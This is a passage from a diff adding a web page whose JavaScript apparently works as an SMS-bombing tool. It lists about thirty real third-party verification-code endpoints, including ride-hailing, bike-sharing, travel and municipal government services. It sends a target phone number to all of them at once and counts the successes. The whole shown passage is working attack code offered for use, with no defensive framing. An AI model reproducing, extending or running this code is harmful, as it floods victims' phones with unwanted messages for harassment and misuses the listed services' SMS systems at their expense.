+                    url: 'https://www.xytongcheng.top/prod-api/app/personal/sendTencent',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://client.gxeszx.com/sms/sendAuthCode.do',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://client4.uqbike.cn/sms/sendAuthCode.do',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://client2.uqbike.cn/sms/sendAuthCode.do',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://wechat.fnjkj.cn/battery_wechat//common/sendMessage',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://bike.ledear.cn/api/user/code',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://service.fnjkj.cn/battery_wechat//common/sendMessage',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://lyapp.lyscycle.com/rest/userlogin/setVerificationCode.ashx',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://test.cheboyi.com/bk-user-api/api/user/sms/sendSmsCode/CBYZHQX-XCX/',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://client.qczhixing.com/sms/sendAuthCode.do',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'http://12345wx.qingdao.gov.cn/weixin/api/account/sendsms/',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'http://36.134.81.191/xyrest/rest/checkcode/getCheckCode',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'http://221.14.255.62:8088/cns-bmfw-webrest/rest/cnsverifywebuserbycode/getSqCheckCode',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'http://szxx.yantai.gov.cn/weixin/weixin/api/sso/sendMessage',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'http://weixin.gys12345.cn/api/wechat.php',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://stdch5.huinongyun.cn/api-uaa/validata/smsCode/',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://wxapp.qunar.com/ucenter/webApi/logincode.jsp',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://app.nahuomall.com/vshop-pop/mp-auth-verify/',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: `https://wxm-api.freshfans.cn/amc/auth/phoneSms?phone=${phone}`,
+                    method: 'GET',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    }
+                },
+                {
+                    url: 'https://dsappapi.liancaiwang.cn/index.php/webapi/smssend',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: `https://bmp-app.herbalifeonline.cn/api/user/web/bmp/sendSmsCode?mobile=${phone}`,
+                    method: 'GET',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    }
+                },
+                {
+                    url: 'https://xcx.dazhang.net.cn/miniapp/member/sendsmscode',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://www.hylyljk.com/ymm-common/sms/sendSmsCode',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://bg.84185858.com/index.php?m=Home&c=Login&a=sendVerifyCode',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://www.aifabu.com/api/account/sendVerifyCode',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://api2.ehuoyun.com/rest/v1/members/verify-code',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://minicap.caocaokeji.cn/passport/getSmsCode/1.0',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://api.miaozo.com/app/sms/v2/login',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://api.saicmobility.com/user/v1/sms/send',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://u.letfungo.com/api/app/user/ebikeUsers/registerSendSMS',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://ddc.jiahengchuxing.com/account/account/sendRegisterCode?fromApi=miniapp',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://esino.xtrunc.com/esino/api/user/phone_auth?3rd=0000*0000&tm=1718386573',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://ride-platform.hellobike.com/api?saas.user.auth.sendCode',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                }
+            ];
+            
+            // 使用Promise.all发送所有请求
+            try {
+                const results = await Promise.all(apis.map(api => sendRequest(api)));
+                addStatusMessage('所有请求已发送完成', 'success');
+            } catch (error) {
+                addStatusMessage('发送过程中出现错误: ' + error.message, 'error');
+            }
+        }
+        
+        // 发送单个请求
+        async function sendRequest(api) {
+            try {
+                const response = await fetch(api.url, {
+                    method: api.method,
+                    headers: api.headers,
+                    body: api.body
+                });
+                
+                // 尝试解析响应，但不依赖于此
+                let result = {};
+                try {
+                    result = await response.json();
+                } catch (e) {
+                    // 如果响应不是JSON格式，忽略错误
+                }
+                
+                addStatusMessage(`请求 ${api.url} 成功`, 'success');
+                successCount++;
+                document.getElementById('successCount').textContent = successCount;
+                return result;
+            } catch (error) {
+                addStatusMessage(`请求 ${api.url} 失败: ${error.message}`, 'error');
+                errorCount++;
+                document.getElementById('errorCount').textContent = errorCount;
+                throw error;
+            }
+        }
+    </script>
+</body>
+  </html>
